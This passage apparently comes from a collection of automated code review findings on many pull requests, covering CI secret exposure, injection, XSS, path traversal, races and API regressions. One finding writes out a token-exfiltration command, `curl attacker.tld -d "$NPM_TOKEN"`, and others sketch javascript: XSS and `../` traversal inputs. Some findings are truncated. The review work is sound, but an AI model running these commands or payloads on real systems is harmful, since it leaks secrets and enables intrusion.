Line 12 then explicitly checks out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 runs `./scripts/measure.sh` from that checkout with `secrets.NPM_TOKEN` injected on line 15.

Entry point: any unprivileged user opening a pull request from a fork. Sink: `./scripts/measure.sh` (and anything it sources, plus any `package.json` lifecycle scripts or config files it reads) executed by the runner shell. An attacker replaces `scripts/measure.sh` in their fork with `curl attacker.tld -d "$NPM_TOKEN"`, or exfiltrates the whole environment and the `GITHUB_TOKEN` from the runner, and can then publish packages or push to the repo.

Remedies, in order of preference:
1. Revert to `on: pull_request`. A size measurement does not need secrets or write access; the fork-scoped token is sufficient.
2. If a secret is genuinely required, split into two workflows: a `pull_request` job that builds the untrusted code and uploads an artifact, and a `workflow_run` job that consumes the artifact without ever checking out or executing fork code.
3. If `pull_request_target` must stay, do not check out `head.sha` — run only base-repo code — and add an explicit least-privilege `permissions:` block (`contents: read`) plus an environment gate requiring maintainer approval before secrets are available.

Note also that no `permissions:` block is declared, so the job inherits the repository default token scope in a privileged context.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with repository secrets

findings.title: Trigger change is not needed to run on forked PRs
findings.body: The PR title says the goal is to run the size check on forked pull requests, but the `pull_request` trigger that was removed already fires for pull requests from forks — it just runs without secrets and with a read-only token. So this change does not fix the stated problem; the only behavioural difference it buys is secret availability, which is precisely what makes it unsafe. If the real symptom was `NPM_TOKEN` being empty on fork PRs, the fix is to restructure the job (see the related finding) rather than to change the trigger.

findings.title: Non-string context keys either collide or raise under sort_keys
findings.body: `json.dumps` coerces non-string mapping keys to strings, so `{1: "a"}` and `{"1": "a"}` serialise identically and map to the same digest — the second call silently returns the first call's rendered output. Worse, `sort_keys=True` on a dict with mixed key types (e.g. `{1: 'a', 'b': 2}`) raises `TypeError: '<' not supported between instances of 'str' and 'int'`. The old tuple key kept `1` and `"1"` distinct. If integer or mixed keys are reachable, serialise `sorted(context.items(), key=repr)` or include the key type in the payload.

findings.title: Test only checks shell=False, not the actual argv content
findings.body: `test_runs_without_a_shell` asserts `spy.last_call.kwargs["shell"] is False` but never inspects `spy.last_call.args` (or positional argv). The whole point of this refactor is that the command is now built as a list (`["tar", "-czf", f"/exports/{name}.tar.gz", "--", directory]`) instead of an interpolated shell string. If a future change reintroduced string interpolation into one of the list elements (e.g. `f"tar -czf ... {directory}"` as a single list item), or dropped the `--` separator, or passed `directory` in the wrong position, this test would still pass because it only checks the `shell` kwarg. Add an assertion on the actual argv list, e.g. `assert spy.last_call.args[0] == ["tar", "-czf", "/exports/nightly.tar.gz", "--", "/srv/data"]`, so the test actually verifies the injection-safe construction of the command rather than a single unrelated flag.

findings.title: `directory` reaches tar unvalidated — arbitrary path archiving
findings.body:
`name` is now allowlisted, but `directory` is passed straight through to `tar` with no validation. With `shell=False` and the `--` separator this is no longer command or option injection, but if `directory` is caller-influenced the function will happily archive any path readable by the process (`/etc`, `/root`, a secrets mount) into `/exports/<name>.tar.gz`, which is an attacker-nameable location and plausibly a served directory — i.e. arbitrary file disclosure rather than code execution.

If `directory` is only ever constructed internally from a trusted base, this is fine and worth a comment saying so. Otherwise, resolve it (`Path(directory).resolve()`) and require it to be under an allowed root before calling `tar`, and consider `--no-recursion`/`-h` semantics so symlinks inside the tree cannot pull in files from outside it.

findings.title: New name allowlist rejects names that previously worked (e.g. dots, >64 chars)
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]` and at most 64 characters, so `create_archive` now raises `ValueError` for names the old shell-based version accepted without complaint \u2014 anything containing a dot (`backup.2024-01-01`), a colon from an ISO timestamp, a slash-free but long tenant/job id, or any non-ASCII character. Callers that build names from timestamps or user-visible labels will start failing at runtime on a path that previously succeeded. Either widen the character class to cover the formats actually in use (e.g. allow `.`) and raise the length cap, or confirm against every call site that no such name is produced. A non-`str` `name` (e.g. `None`) also raises `TypeError` from `fullmatch` rather than the documented `ValueError`.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render(Invoice(lines=[])) but never checks the result. It will pass regardless of what render() returns, including a crash-free but incorrect output (or even always passes unless an exception is raised). Add an assertion on the returned string, e.g. asserting it equals an expected 'empty invoice' representation or total.

_Also raised by the correctness agent:_ test_renders_empty_invoice has no assertion

findings.title: Test asserts on mock call_count, not actual output
findings.body:
test_renders_line_items patches format_line and only checks that it was called twice. This will pass even if render() ignores the formatted output entirely, joins it incorrectly, or produces garbled text. It should assert on the actual rendered string returned by render(), e.g. checking that both line items' formatted representations appear in the output.

_Also raised by the correctness agent:_ Line-item test asserts on a mock's call count, not on rendered output

findings.title: Deleted test removes coverage for half-to-even rounding fix
findings.body:
The PR deletes test_rounds_half_to_even, which asserted round_cents(Decimal('2.345')) == Decimal('2.34'). This is the exact test that would exercise the rounding fix described in the PR title. Removing it means a future regression in half-to-even rounding behavior would go undetected. If the fix was correct, the test should have been updated/kept to assert the corrected expected value, not deleted.

_Also raised by the correctness agent:_ Deletes the only half-to-even boundary test without a replacement

findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` into the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `send_with_retry` continues to call the original function object it captured. The test therefore exercises the real `deliver` — it will hit whatever the transport actually does (network, side effects), and it asserts `False` only by accident if delivery happens to fail, or fails/hangs if it happens to succeed. Either way it does not prove the give-up-after-three-failures behaviour.

Use the same target as the passing test above it: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the mock's `call_count == 3` so the retry count is actually verified, since `attempts=3` is already the default and the current assertion alone cannot distinguish 1 attempt from 3.

_Also raised by the tests agent:_ Mock patches wrong target, real deliver() still executes

findings.title: csv_rows does not use csv_escape, emitting malformed CSV
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` on the raw value, so a field whose value contains a comma or a double quote is written unquoted and silently shifts every subsequent column of that row. The escaping helper needed to fix this is added five lines below in the same commit but is never called. Route each field through it: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: csv_escape raises on non-str input and ignores newlines
findings.body:
`"," in value` raises `TypeError: argument of type 'int' is not iterable` for any non-string value, which is the natural thing a caller holding row dicts will pass (`csv_escape(row["count"])`). It also does not quote values containing `\n` or `\r`, which break the record boundary in every CSV reader just as a comma breaks the field boundary. Coerce with `value = str(value)` first and extend the condition to include `"\n"` and `"\r"`.

_Also raised by the security agent:_ csv_rows joins fields without calling csv_escape

findings.title: New exporter functions untested across csv/json/pdf export modules
findings.body: csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width are all new public functions with no accompanying tests. The repository already has a precedent (reports/tests/test_csv.py) of testing exporter functions directly on their output, so these should follow the same pattern, e.g. verifying csv_escape quotes values containing commas/quotes, csv_rows joins values in column order, dump_streaming chunks correctly at boundaries, dump_pretty produces indented/sorted JSON, and margins_for/usable_width compute correct point values from page_size.

findings.title: Date comparison flakes when the two clock reads straddle UTC midnight
findings.body:
`token.issued_at` is sampled inside `issue_token()` and `datetime.now(timezone.utc)` is sampled again on the next line. These are two distinct reads of the wall clock, so if the first lands at 23:59:59.999Z and the second at 00:00:00.000Z the `.date()` values differ and the test fails, with no code defect involved. CI that runs on a schedule or a slow machine will hit this eventually and the failure will be unreproducible.

The fix is to remove the ambient clock from the assertion: either have `issue_token()` accept an injected `now` (matching the style of `is_expired(..., now=...)` already used on line 6) and assert against that fixed value, or capture `before = datetime.now(timezone.utc)` and `after = datetime.now(timezone.utc)` around the call and assert `before <= token.issued_at <= after`. The same applies to line 12: `is_expired(token.expires_at)` with no `now=` argument leaves the assertion dependent on real elapsed time, whereas line 6 shows the function supports an explicit `now`.

_Also raised by the tests agent:_ Flaky test: date-boundary race in test_token_issued_today_is_valid

findings.title: New CouponExpired branch is untested
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated in this PR (test_apply_coupon_reduces_total) uses a coupon with expires_at=tomorrow(), which never exercises this branch. If the expiry check were removed, inverted, or the exception type changed, no test would fail. Add a test that constructs a coupon with an expires_at in the past and asserts CouponExpired is raised (and ideally that order.total is left unmodified).

findings.title: Missing/None expires_at raises TypeError or AttributeError, not CouponExpired
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` is evaluated unconditionally. The test in this same PR had to be amended from `Coupon(amount=10)` to `Coupon(amount=10, expires_at=tomorrow())`, which shows that coupons were previously constructed without an expiry — so a never-expiring coupon most likely carries `expires_at=None` (or no attribute at all). In that case this line raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'` (or `AttributeError`) rather than applying the coupon. Guard it: `if coupon.expires_at is not None and coupon.expires_at < now: raise CouponExpired(...)`.

findings.title: Public function lacks documentation of new exception
findings.body: The `apply_coupon` function now raises `CouponExpired` when a coupon has expired (line 9-10), but there is no docstring documenting this exception or its contract. Callers need to know they must handle this exception or let it propagate. A docstring explaining the function's behaviour, parameters, return value, and exceptions would clarify the public API.

findings.title: Blocking requests.get inside async handler stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def` but never awaits anything: `requests.get` is a synchronous, blocking call. When this coroutine runs on the event loop, the whole loop — every other in-flight request on the worker — is stalled for the duration of the HTTP round-trip, up to the 5 second timeout (and longer if DNS/connect hangs before the timeout applies). Under any concurrency this turns into cascading latency and timeouts elsewhere.

The file already imports `httpx` and the sibling `fetch_plan` demonstrates the correct pattern. Either take an `httpx.AsyncClient` the same way `fetch_plan` does and `await client.get(...)`, or if a client cannot be threaded through, create one locally:

```python
async def fetch_plan_limits(tenant_id):
```

findings.title: Async function makes blocking synchronous call without documenting it
findings.body: The function `fetch_plan_limits` is declared as `async` but makes a blocking synchronous HTTP call via `requests.get()` on line 11. A caller will reasonably expect an async function to be non-blocking and will `await` it, but this call will block the entire event loop. findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds the request URL by f-string interpolation of `tenant_id` directly into the path of `https://billing.internal/limits/{tenant_id}`. If `tenant_id` originates from a request parameter anywhere upstream, a value containing `../` or `?`/`#` lets a caller reach arbitrary paths on the internal billing host (e.g. `../../admin/keys`), turning a scoped lookup into a general read against a service that is presumably only reachable server-side and may trust internal callers. `requests` does not percent-encode path segments for you here.

Fix by validating the identifier shape before use (e.g. reject anything not matching a UUID/`[A-Za-z0-9_-]+` pattern) or by passing it through `urllib.parse.quote(str(tenant_id), safe="")`. Note the same interpolation pattern already exists on line 6 for the httpx client, so a shared validation helper is probably the right shape.

I cannot see the caller of `fetch_plan_limits` in this diff and no repository context was retrieved, so I cannot confirm `tenant_id` is attacker-influenced rather than an internally-derived value; confidence is lowered accordingly.

findings.title: try_consume reads and writes _counters across an await without _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at `await asyncio.sleep(0)` on line 18, then writes back `current + cost` on line 19. Two problems follow:

1. **Limit bypass (check-then-act):** any number of tasks can pass the `current + cost > LIMIT` check on line 16 while suspended at line 18, then all commit their writes. The effective ceiling becomes unbounded rather than `LIMIT`.
2. **Lost update:** line 19 assigns an absolute value computed from a pre-await snapshot instead of incrementing. Any `consume()` call (which does take `_lock`, lines 9–11) or other `try_consume` that ran during the suspension is silently overwritten — the counter can even go *down*. `consume`'s lock provides no protection because `try_consume` never acquires it.

Fix: wrap the whole read/check/write in `async with _lock:` (and move or drop the `await asyncio.sleep(0)` — awaiting inside the lock is fine here since it is the only mutation path, but the write must be derived from a value read under the same lock held continuously):

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

_Also raised by the security agent:_ Rate limit bypassable: check-then-act across await without lock

findings.title: No test exercises the check-then-act race in try_consume

Concurrent calls can both pass the LIMIT check before either writes, allowing the tenant's counter to exceed LIMIT. There is no test in this diff (or referenced) that runs two concurrent try_consume calls to verify the limit is actually enforced under concurrency, so this race would not be caught.

findings.title: Insert failure is logged and swallowed; WriteSettlement always returns nil
findings.body:
The error from `db.Exec` is bound to an `err` scoped to the `if` statement on line 15. Inside that block it is only logged (line 16); control then falls through to lines 18-19, which declare a *fresh* `var err error` (always nil) and return it. So `WriteSettlement` returns `nil` unconditionally once validation passes, and a caller cannot distinguish a written settlement from a failed insert \u2014 settlement rows are silently dropped while the caller commits/acks as if they landed.

Fix by returning the insert error directly, matching the shape of `WriteEntry` just above:

```go
if _, err := db.Exec("INSERT INTO settlements (id, cents) VALUES ($1, $2)", s.ID, s.Cents); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

findings.title: Mutable default arg makes send_with_retries accumulate state across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that omits `attempted` shares the same list object. Line 10 appends to it and line 11 returns it, so the second call to `send_with_retries(recipients)` returns the failures from the first call plus its own, and the list grows without bound for the process lifetime. Callers that treat the return value as "recipients that failed in this batch" will get wrong results and may re-send to already-succeeded recipients. Use the same pattern as line 2 in this file: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted or [])` (or `[] if attempted is None else attempted`) at the top of the body.

findings.title: compute_rounding flips >= 0.5 to > 0.5, losing half-cent round-up
findings.body:
The rounding predicate changed from `line.remainder_cents >= 0.5` to `line.remainder_cents > 0.5`. For the exact boundary value `remainder_cents == 0.5` the function now returns 0 instead of 1, i.e. standard half-up rounding becomes round-half-down. A remainder of exactly 0.5 is not an exotic input here — it is the single most common remainder when splitting an odd cent amount in two — so this will under-bill or under-credit by one cent on a routine case. If the change is intentional it needs a test and a changelog note; otherwise restore `>=`.

findings.title: File handle leaks on validation-failure and exception paths
findings.body:
`fh = open(path)` is only closed on the single success path at line 16. findings.title: Retry wrapped around non-idempotent charge can double-charge
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that happens *after* the gateway has accepted the POST (timeout on the response, connection reset, 5xx returned after commit) triggers up to two more `/charges` calls, each creating an additional real charge. The read wrapper `fetch_charge` above is fine because `get_charge` is safe to repeat; the same decorator is not safe here.

Fix: generate a stable idempotency key per logical charge attempt and pass it through the gateway's documented `Idempotency-Key` header, so retries collapse into one charge. If the key cannot be plumbed through, drop the retry on this path and surface the failure to the caller instead.

findings.title: Naive datetime subtracted from tz-aware expires_at raises TypeError
findings.body:
`datetime.now()` returns a naive local datetime, but `Invite.expires_at` is documented as always timezone-aware UTC (`set from datetime.now(timezone.utc)`). Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every invite, not just an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does: `cutoff = datetime.now(timezone.utc).replace(microsecond=0)`. Even with a naive-but-UTC clock this would silently skew by the local UTC offset; the fix should be the aware form.

Worth confirming the intended semantics too: for an already-expired invite `delta` is negative, so `total_seconds() < hours * 3600` returns True — if callers expect "expiring soon but still valid", a lower bound (`0 <= delta.total_seconds()`) is needed.

findings.title: Duplicate index: same columns/order as invoices_tenant_created_idx (0007)
findings.body: `invoices_tenant_created_idx2` is defined on `invoices (tenant_id, created_at DESC)` \u2014 identical table, column list and sort order to `invoices_tenant_created_idx`, created in `migrations/0007_invoice_indexes.sql` and applied 2025-11-02. findings.title: Referer logged unscrubbed, leaking auth tokens into logs
findings.body: The removed branch routed the `Referer` value through `_scrub_uri(value, extra_param_keys)` before logging; the replacement copies `request.headers[header]` verbatim for every header including `Referer`. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser sends that token in the Referer of every subresource request. Any 5xx now writes a live auth token into the log, where it is readable by anyone with log access and typically retained/shipped off-host. Restore the scrubbing for `Referer` (and keep the direct copy for the other three headers) rather than removing the special case.

findings.title: Auth token in Referer is now logged verbatim (scrubbing removed)
findings.body:
Entry point: `request.headers["Referer"]`, an attacker- and browser-controlled value that in Jupyter's own URL scheme contains the session token (`token_authenticated_url` builds `?token=...`, and the browser echoes that URL in Referer on every subresource request). Sink: `log_method(json.dumps(headers, indent=2))` on line 6.

Previously the Referer was passed through `_scrub_uri(value, extra_param_keys)` before being added to `headers`; line 5 now copies the raw header. Any 5xx (or whatever level this log_method fires at) will persist a valid auth token into the server log, where it is readable by anyone with log access, log shipping, or a support bundle — and the token grants full access to the running server.

Restore the conditional scrub:

```python
value = request.headers[header]
if header == "Referer":
    value = _scrub_uri(value, extra_param_keys)
headers[header] = value
```

findings.title: xlinkhref no longer URL-validated, re-enabling javascript: XSS
findings.body:
Line 6 narrows the guard to `href` and `src`, so an attribute named `xlinkhref` now falls through to whatever the function's default path is instead of `isAnchorLinkAllowed(value)`. SVG's `xlink:href` is script-executing in the same way `href` is: `<svg><a xlink:href="javascript:...">` runs in browsers that still honour the XLink namespace, and `data:text/html` payloads are equally reachable. Per the file header comment, this markdown includes end-user-submitted content and `validateProp` is the only barrier before the DOM, so the removal directly restores a stored-XSS path. Restore `|| attribute === 'xlinkhref'` in the condition (and keep any normalisation that maps `xlink:href` to `xlinkhref` intact) unless there is a separate, demonstrated sanitiser for that attribute.

findings.body:
`query.GetProjectQueryParam()` is now passed through with only a length check and an equality check against `parameters.Project`. The file DAO's `buildPath` documents that it performs no validation of its own and that "callers are required to have validated the names before this point", then hands the value straight to `filepath.Join(d.Folder, project, kind)`. A value such as `../../etc` or `..%2f..` therefore escapes the storage root and lets a caller list documents outside the configured folder. findings.title: Buffer reserved from untrusted Content-Length before body is read
findings.body:
`Reserve(contentLength)` commits memory sized by a value the client declares in the request header, and it does so before `io.Copy` has read a single byte of the body. A client can send `Content-Length: 10000000000` with an empty or slowly-trickled body and force the server to allocate (or attempt to allocate) that much memory per in-flight part; several concurrent requests exhaust the process. The previous code deliberately grew the pool-backed RW a page at a time as bytes actually arrived, which bounds the allocation by the data genuinely received.

Either drop the `Reserve` call and let the RW grow on demand, or clamp it: `Reserve(min(contentLength, maxPartSize))` with `maxPartSize` a server-side constant, and only after validating `contentLength > 0`. Additionally, the copy result `n` should be checked against `contentLength` so a body shorter than declared is rejected rather than silently stored.

_Also raised by the security agent:_ Buffer sized from client-declared Content-Length before body is read

findings.title: No test guards against pre-allocating from client-declared length
findings.body: The change pre-reserves buffer capacity using the client-supplied `contentLength` before any bytes are read, reintroducing a memory-exhaustion vector that a prior fix presumably removed. There is no test in this diff (or evident in surrounding code) that exercises multipart upload with a large or mismatched declared Content-Length to verify memory usage or reject oversized reservations. If this behavior is wrong, nothing currently fails — a test asserting bounded allocation or rejection of an implausible contentLength would be needed to catch a regression here.

findings.title: Default scheme flips to plaintext http when is_secure meta is absent
findings.body:
The previous expression `"http" if request.meta.get("is_secure") is False else "https"` only downgraded to HTTP when a caller explicitly set `is_secure = False`; every other case (key absent → `None`, or `True`) produced `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats the absent key (`None`) as falsy and yields `http`.

Since the overwhelmingly common case is that `is_secure` is never set in `request.meta`, this makes plaintext the default for every AWS-signed request built at line 6, sending the signed URL and Authorization material over an unencrypted connection. It also silently changes behaviour for existing callers that relied on the secure-by-default contract without touching their code.

Restore the explicit-opt-out form, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or default the lookup: `request.meta.get("is_secure", True)`.

_Also raised by the security agent:_ S3 requests default to plaintext HTTP when is_secure meta is unset

findings.title: No test guards the default scheme when is_secure is unset
findings.body: The scheme selection was inverted so that when request.meta has no 'is_secure' key, the scheme now defaults to 'http' instead of 'https'. There is no test in this diff exercising download_request with meta lacking 'is_secure' to assert the resulting url starts with 'https://'. If such a test existed and asserted the previous default, it would need updating; if none exists, this behavior change (plaintext-by-default) would go completely uncaught by CI.

findings.title: DELETE now requires only 'push' action, dropping the delete check
findings.body:
The removed `case http.MethodDelete: action = "delete"` arm means a DELETE request now produces `ResourceAction{Action: "push"}`. Any credential scoped to push on a repository will pass authorization for tag/manifest deletion, which is exactly the separation the config documentation says is intentional ("an account may be allowed to push new tags without being allowed to delete existing ones"). Restore the explicit DELETE branch so `action = "delete"` is propagated to the access check.

_Also raised by the security agent:_ DELETE now authorized by push scope; delete permission bypassed

findings.title: DELETE method now maps to 'push' instead of 'delete', contradicting config documentation
findings.body: The config documentation in pkg/api/config/config.go explicitly defines three distinct actions: pull, push, and delete. It states 'an account may be allowed to push new tags without being allowed to delete existing ones.' The code change removes the DELETE-to-delete mapping, causing DELETE requests to now map to 'push' instead. This violates the documented API contract where delete is supposed to be a separate, distinct action from push.

findings.title: No test guards DELETE-to-action mapping change
findings.body: The change collapses the method-to-action switch so that HTTP DELETE now maps to 'push' instead of 'delete'. This is a behavior change to an access-control decision, and no test in this diff exercises the case where the request method is DELETE and asserts the resulting action or resulting authorization outcome. If this mapping is wrong (as the PR title suggests it may be), no test would fail.

findings.title: Unknown methods (OPTIONS, TRACE) now default to 'push' instead of 'pull'
findings.body: The old `default: action = "pull"` arm covered any method outside the enumerated set. The new condition treats everything that is not GET/HEAD as a write, so OPTIONS (CORS preflight) and any other method now demand push access and will be rejected for pull-only credentials that previously succeeded. If the previous permissive default was deliberate, keep the explicit enumeration of POST/PATCH/PUT for the push branch rather than inverting the test.

findings.title: Misleading function name: get_* should not mutate
findings.body: The function `get_tenant_fresh` uses the `get_*` naming convention, which by widespread convention indicates a read-only lookup operation. However, the function mutates the cache by writing to `_CACHE[tenant_id]` and conditionally clearing it. A caller expecting idempotent read semantics from a `get_*` function could introduce bugs—for example, calling it multiple times in quick succession with different tenant IDs could trigger an unexpected cache flush on the 1001st call. Rename to `fetch_tenant` or `load_tenant` to signal that mutation occurs.

findings.title: Eviction clears the entry that was just inserted
findings.body: On the call that crosses the 1000-entry threshold, the freshly fetched tenant is stored on line 10 and then immediately discarded by `_CACHE.clear()` on line 12. The function still returns the value, so the caller is fine, but the write-through is silently lost and the very next `get_tenant(tenant_id)` is a miss. Wiping the whole map also drops every other warm entry at once, so all concurrent readers fall through to `_fetch` together. Prefer bounded eviction (e.g. `collections.OrderedDict` + `popitem(last=False)`, or an LRU) so the current entry survives and eviction is incremental.

findings.title: No test coverage for get_tenant_fresh's cache mutation/eviction logic
findings.body: get_tenant_fresh writes into _CACHE and clears it entirely once it exceeds 1000 entries. There is no test file in this diff exercising either behaviour, so a bug in the eviction threshold, the clearing logic, or the cache-write itself would go undetected. If the surrounding repo has no existing tests for cache/lookup.py, this is a policy gap rather than a regression, but the eviction logic (line 11-12) in particular is easy to get wrong (off-by-one, clearing instead of evicting oldest) and worth at least one direct test.

findings.title: README documents renamed CLI flag by old name
findings.body: The README at line 7 still documents the flag as `--workers`, but cli.py line 6 has renamed it to `--concurrency`. A user following the README will use the wrong flag name and the tool will not recognize it. Update the README to reflect the new flag name.

findings.title: Renaming --workers changes args.workers to args.concurrency
findings.body: `add_argument("--concurrency", ...)` makes argparse store the value under `args.concurrency`. Any code that still reads `args.workers` (pool sizing, config merge, tests) will now raise `AttributeError` at runtime rather than fail at import, so it may not be caught until the flag path executes. Either update all readers in the same change, or keep the attribute stable with `add_argument("--concurrency", "--workers", dest="workers", ...)`. Separately, the old spelling is no longer accepted at all, so existing scripts/CI invoking `--workers` will exit with "unrecognized arguments"; if that surface is public, add `"--workers"` as a deprecated alias for a release.

findings.title: Flag rename from --workers to --concurrency has no test coverage
findings.body: The argparse flag was renamed from --workers to --concurrency. If this rename were reverted or broken (e.g. typo'd), nothing would fail — there's no test asserting the parser accepts --concurrency or rejects/accepts --workers. Given no test file exists in this diff or apparent in the repo, this may be consistent with the project's current testing standard, but it's worth flagging since it's a user-facing CLI contract change.

findings.title: Docstring contradicts changed return type
findings.body: The docstring states the function 'Return the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping days to counts. Any caller relying on the documented contract will break. Update the docstring to describe the new return format: `{"day": count, ...}`.

findings.title: Return type changed from int to dict, breaking existing callers
findings.body:
`monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. Any caller doing arithmetic, comparison or formatting on the result (`usage > limit`, `usage + n`, `f"{usage} calls"`) will now either raise `TypeError` or silently produce wrong output — a dict compared with an int raises, and a dict formatted into a string produces nonsense rather than failing loudly. The empty case also changes from `0` to `{}`, so `if not usage` still works but `usage == 0` no longer does.

Either keep the scalar contract and add a separate `daily_usage()` function, or change the name/signature so every call site is forced to be updated, and update the docstring on line 2 which still promises "the total number of API calls this month as an integer".

findings.title: No test covers new day-by-day return shape of monthly_usage
findings.body: The function's return type changed from an integer total to a dict keyed by day, but no test file appears in this diff. If the grouping or key naming is wrong (e.g. wrong SQL, wrong key name, empty rows handling), nothing would fail. Add a test asserting the returned dict shape and values against known DB rows.

findings.title: Docstring references old parameter name 'page_size'
findings.body: The docstring on line 6 documents 'page_size: how many invoices to return.' but the function parameter was renamed to 'limit' on line 1. Callers reading the docstring will see documentation for a parameter that no longer exists in the function signature, which is actively misleading. Update the docstring to refer to 'limit' instead of 'page_size'.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body: `page_size` is a public, defaulted parameter, so it is callable by keyword: `list_invoices(tid, page_size=100)`. After this rename, any such call raises `TypeError: list_invoices() got an unexpected keyword argument 'page_size'`, and the failure is at call time rather than import time, so it will not be caught by a smoke import. Either grep and update every call site in the same change, or keep backward compatibility for a release — e.g. accept `page_size=None` as a deprecated alias and map it onto `limit` — before removing it. No callers were included in the retrieved context, so the number of affected sites is unverified; please confirm before merging.

findings.title: Absolute `from adapters import HTTPAdapter` breaks package import
findings.body: Every other intra-package import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` is an absolute import of a top-level module named `adapters`, which does not exist on the path when `requests` is installed. This raises `ImportError` at `import requests` time under Python 3 (and under Python 2 only works by accident of implicit relative imports when cwd happens to be the package dir). Change it to `from .adapters import HTTPAdapter`.

findings.title: verify/cert accepted by request() but never applied to the send path
findings.body:
The new `request()` signature still advertises `verify` and `cert` (lines 148-149), but neither value is copied onto `req`, passed to `req.prepare()`, or handed to `self.send(prep)`. `send()` then constructs a bare `HTTPAdapter()` with no configuration at all, so whatever TLS policy the adapter defaults to is what every request gets.

Concretely: a caller doing `session.get(url, verify='/etc/ssl/corp-ca.pem')` or relying on a session-level verify setting now silently gets the adapter default instead, and a caller passing `cert=(...)` gets no client certificate. Either the caller believes peer verification is pinned/enabled when it is not, or mutual-TLS auth breaks. The failure is silent — no exception, no warning.

Thread `verify` and `cert` through to the adapter (e.g. `self.send(prep, verify=verify, cert=cert)` with a matching `HTTPAdapter.send` signature), or remove the parameters until they are wired up so callers cannot be misled.

I cannot see `adapters.HTTPAdapter` in the provided context, so I cannot confirm whether its default is verify-on or verify-off; if it defaults to off this is an unconditional downgrade to unauthenticated TLS for every caller, which is why I have rated it as removal of a control.

findings.title: `_send_request` deleted but `old_request` still calls it
findings.body: The `_send_request` helper is removed in this hunk, but its only visible call site — the final line of `old_request` — is left intact. Any path that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either delete `old_request` along with the helper or keep the helper until the caller goes away.

findings.title: poolmanager removed and close() made a no-op; connections now leak
findings.body: `init_poolmanager()` and the `self.poolmanager` attribute are gone, and `close()` (also reachable via `__exit__`, line 129) is now `pass`. Three consequences: (1) `Session.init_poolmanager` and `session.poolmanager` were public enough to be subclassed/overridden for custom pool sizing — those subclasses now break or silently stop taking effect; (2) `with session:` no longer releases anything; (3) `send()` constructs a fresh `HTTPAdapter()` per call (line 365), so each request gets its own pool that is never cleared, replacing pooling with per-request socket churn. The adapter should be created once and owned by the Session, and `close()` should delegate to it.

findings.title: New request() silently ignores timeout/verify/cert/prefetch and all session state
findings.body: The rewritten `request()` accepts `timeout`, `allow_redirects`, `return_response`, `config`, `prefetch`, `verify` and `cert` but never uses `timeout`, `return_response`, `config`, `prefetch`, `verify` or `cert` — they are accepted and dropped, so `session.get(url, timeout=1)` now blocks forever and `verify=False`/`cert=...` silently stop applying TLS policy. `self.send(prep)` also takes no transport arguments, so there is no later point at which they could be honoured. Separately, none of the session-level state (`self.headers`, `self.cookies`, `self.auth`, `self.params`, `self.config`) is merged into the request any more, so a `Session` no longer behaves differently from a bare request. Silently discarding an argument is worse than not accepting it; either thread these through to `send()`/the adapter or drop them from the signature while the refactor is in flight.

findings.title: close() now silently does nothing; no test would catch it
findings.body: close() previously cleared the poolmanager to release pooled connections; it is now just `pass`. If this is meant to be temporary during the adapter refactor, nothing in the diff verifies that connections are still released somewhere (e.g. via the new HTTPAdapter). If it's a genuine regression, no test exists that would fail because of it — resource cleanup on Session.close() is not exercised anywhere in this change.

findings.title: send() now routes through a brand-new HTTPAdapter with no test exercising it
findings.body: Session.send previously called request.send() directly; it now constructs an HTTPAdapter and delegates to adapter.send(request). This is the central behavior change of the refactor (the whole point of introducing PoolManager-backed adapters), yet nothing in the diff shows a test that would fail if HTTPAdapter.send() returned the wrong thing, dropped request data, or behaved differently from the old request.send() path.

findings.title: Stale docstring in close() method
findings.body: The `close()` method's docstring (lines 131–137 in the original) describes closing a PoolManager and pooled connections, but the method now contains only `pass`. This documentation is now incorrect and misleading. Either restore the documented functionality or remove the stale docstring.

findings.title: Non-relative `from adapters import ...` resolves against sys.path
findings.body:
Every other import in this block is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...`), but this one is absolute. It therefore resolves against `sys.path`, which on Python 2 includes the script's directory and on any version includes the current working directory for `-c`/REPL/`python script.py` invocations. Any `adapters.py` sitting earlier on the path — dropped in a shared working directory, a writable deploy dir, or a sdist unpack location — will be imported instead of the intended package module, and its top-level code runs with the host process's privileges. Since the object it yields is what every outbound request is routed through (line 366), a shadowing module also gets to observe or rewrite every request and response.

Make it `from .adapters import HTTPAdapter`.

findings.title: cookies property returns None on parse failure, breaking all callers
findings.body:
